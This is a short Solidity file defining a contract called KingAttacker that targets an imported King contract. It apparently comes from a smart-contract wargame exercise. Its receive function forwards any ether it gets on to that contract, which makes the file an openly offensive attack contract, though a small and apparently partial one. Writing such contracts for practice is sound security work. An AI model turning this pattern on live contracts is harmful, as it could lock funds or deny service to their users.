// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttacker {

    address king;

    constructor(address _king) {
        require(_king != address(0));
        king = _king;
    }

    receive() external payable {
        (bool sent, ) = payable(king).call{ value: msg.value }("");
        require(sent);
    }
}
